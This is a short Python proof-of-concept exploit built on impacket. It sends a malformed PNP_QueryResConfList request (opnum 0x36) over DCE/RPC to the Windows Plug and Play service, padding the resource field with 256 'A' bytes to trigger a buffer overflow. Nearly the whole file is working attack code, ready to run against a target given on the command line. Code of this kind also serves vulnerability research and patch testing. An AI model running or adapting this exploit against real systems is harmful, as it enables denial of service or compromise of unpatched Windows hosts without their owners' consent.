import sys
from exploit import DCERPCExploit
from impacket.structure import Structure

class PNP_QueryResConfList(Structure):
    alignment = 4
    structure = (
	('treeRoot',    'w'),
	('resourceType','<L=0xffff'),
	('resourceLen1','<L-resource'),
	('resource',    ':'),
	('resourceLen2','<L-resource'),
	('unknown_1',   '<L=4'),
	('unknown_2',   '<L=0'),
	('unknown_3',   '<L=0'),
    )

class UMPNPExploit(DCERPCExploit):
    UUID = ('8d9f4e40-a03d-11ce-8f69-08003e30051b','1.0')

    def attackRun(self):
	query = PNP_QueryResConfList()

	query['treeRoot'] = "ROOT\\ROOT\\ROOT\x00".encode('utf_16_le')
	query['resource'] = '\x00'*8+'\x00\x01\x00\x00'+'A'*256

	self.dce.call(0x36, query)

e = UMPNPExploit(sys.argv[2:])
e.run()
